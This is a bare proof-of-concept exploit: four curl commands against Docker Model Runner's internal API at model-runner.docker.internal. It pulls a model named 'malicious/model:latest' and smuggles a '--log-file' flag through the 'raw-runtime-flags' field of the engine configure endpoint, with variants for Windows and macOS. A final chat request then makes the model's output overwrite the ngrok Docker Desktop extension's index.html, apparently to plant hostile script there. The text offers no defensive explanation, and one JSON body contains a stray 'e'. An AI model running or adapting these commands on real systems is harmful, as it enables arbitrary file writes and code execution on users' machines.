# 1. OS independent
curl -X POST http://model-runner.docker.internal/models/create -d '{
    "from":"malicious/model:latest"
}'
# 2a. For Windows
curl -X POST http://model-runner.docker.internal/engines/_configure -d '{
    "model":"malicious/model:latest",
    "raw-runtime-flags":"--log-file C:\\\\Users\\\\$USERNAME\\\\AppData\\\\Roaming\\\\Docker\\\\extensions\\\\ngrok_ngrok-docker-extension\\\\ui\\\\ui\\\\index.html -n 1"
}'
# 2b. For macOS
curl -X POST http://model-runner.docker.internal/engines/_configure -d '{
    "model":"malicious/model:latest",
    "raw-runtime-flags":"--log-file ./extensions/ngrok_ngrok-docker-extension/ui/ui/index.html -n 1"
}'
# 3. OS independent
curl http://model-runner.docker.internal/engines/llama.cpp/v1/chat/completions -d '{
    "model":"malicious/model:latest",
    "messages":[{e
        "role":"user",
        "content":"hey there!"
    }]
}'
